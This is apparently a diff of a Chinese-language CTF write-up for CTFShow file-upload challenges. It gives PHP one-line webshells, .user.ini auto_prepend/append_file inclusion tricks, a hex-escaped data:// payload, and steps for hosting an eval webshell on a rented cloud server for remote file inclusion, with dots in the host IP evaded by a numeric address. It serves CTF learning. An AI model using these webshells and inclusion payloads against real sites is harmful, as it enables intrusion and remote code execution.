@@ -142,6 +142,7 @@ url/1.txt 在UA上写入`<?php eval($_POST[1])?>`会报错404，没关系，木�
 操作与上题一样，注意配置文件和1.txt的空格就行
 1.txt`<?=include'/var/lo'.'g/nginx/access.lo'.'g'?>`
 .user.ini`auto_prepend_file=1.txt`
+
 161
 -
 这次上传`.user.ini`显示文件类型不合规。
@@ -166,48 +167,126 @@ url/1.txt 在UA上写入`<?php eval($_POST[1])?>`会报错404，没关系，木�
 日志包含：
 远程包含调用
 
-由于过滤了. 所以使用远程包含
+由于过滤了`. `所以使用	**远程包含**
 
-1. 将木马上传至远程服务器，由于过滤了. 所以需要转换下，mm
+1. 将木马上传至远程服务器，由于过滤了`. `所以需要转换下，mm
 
-<?php eval($_POST[x]);?>
+`<?php eval($_POST[x]);?>`
 或者
-<?php system('cat ../f*');?>
+`<?php system('cat ../f*');?>`
 2. 上传包含文件 .user.ini
-
-GIF89a
+```
+GIF89a 
 auto_prepend_file=txt
+```
 3. 上传远程调用文件 txt IP转数字
-
+```
 GIF89a
 <?=include"http://数字IP/mm"?>
+
+```
 4. 访问upload
 
 ----
+
+[ANSI-C 编码 & 进制转换工具箱](https://xobear.cn/CTF/Web/PHP/ansi-c-encode.html)
+
 data伪协议绕过
 
-payload构造：GIF89a<?=include"data://text/plain,<?\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b"?右尖括号
+`data://text/plain,内容 `的意思是：创建一个“内容直接写在地址里的虚拟文件”。
 
-在include可以使用的前提下，利用伪协议执行代码。将我们的代码<?php system($_GET['cmd']);进行字符串转义来绕过即可。
+payload构造：`GIF89a<?=include"data://text/plain,<?\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b"?>`
 
-上传一个文件png，内容为GIF89a<?=include"data://text/plain,<?\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b"?右尖括号
+在include可以使用的前提下，利用伪协议执行代码。将我们的代码`<?php system($_GET['cmd']);`进行字符串转义来绕过即可。
 
-再上传一个文件.user.ini，内容为
+上传一个文件png，内容为`GIF89a<?=include"data://text/plain,<?\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b"?>`
 
-GIF89a auto_prepend_file = png
+再上传一个文件`.user.ini`内容为
 
-最后访问/upload/?cmd=cat ../flag.php即可
+`GIF89a auto_prepend_file=png`
 
-fu
+最后访问`/upload/?cmd=cat ../flag.php`即可
 
+
+163
 -----
 
+远程文件包含（从服务器购买到找到flag）
+服务器选用 腾讯云   在微信小程序上买的CVM
+
+`按量计费`
+`地区任意选`
+`实例配置不用管`
+`公共镜像Ubantu`
+`存储最低20G`
+`网络默认`
+`公网带宽，一定要勾上，免费分配独立公网IP`
+`计费模式按流量使用`
+`登录方式自动生成密码（可以改）`
+
+安全组，只需勾选`TCP：22`和`TCP：80`就行
+
+大概配置费0.21RMB/小时，带宽0.8RMB/G
+
+操作如下
+
+记住自己的公网IP，电脑打开终端`ssh ubuntu@自己IP`
+密码在控制台自己看（终端输入密码是看不到的）
+
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785463988435_image.png)
+
+	mkdir -p ~/rfi-static  /创建目录
+	cd ~/rfi-static
+	printf '%s\n' '<?php eval($_GET["cmd"]);'> index.html
+	sudo python3 -m http.server 80 --bind 0.0.0.0
+
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785464170870_image.png)
+直接输入ip出现这样就完成一半了
+
+接下来就是准备上传`.user.ini`
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785464277192_image.png)
+
+注意，文件内容有过滤,`.`用不了。 这里用的是纯数字长地址  就是把a.b.c.d转为纯数字
+
+计算公式`a.b.c.d = a*256^3 + b*256^2 + c*256 + d`
 
 
+脚本如下
+```
+import ipaddress
 
 
+def main():
+    ip = input("请输入 IPv4 地址，例如 1.2.3.4：").strip()
+
+    try:
+        addr = ipaddress.ip_address(ip)
+    except ValueError:
+        print("输入错误：这不是合法的 IP 地址")
+        return
+
+    if addr.version != 4:
+        print("输入错误：只支持 IPv4 地址")
+        return
+
+    print(f"纯数字长地址：{int(addr)}")
 
 
+if __name__ == "__main__":
+    main()
+
+```
+```
+GIF89a      /有对文件头的检查，GIF89a可以通过
+auto_append_file=http://ip长地址/
+```
+上传成功后访问 `url/upload/`
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785465145900_image.png)
+然后给GET就可以了
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785465091083_image.png)
+
+图片有被包含
+只要图片二次渲染中有我们的一句话木马就可以RCE	
 
 
 
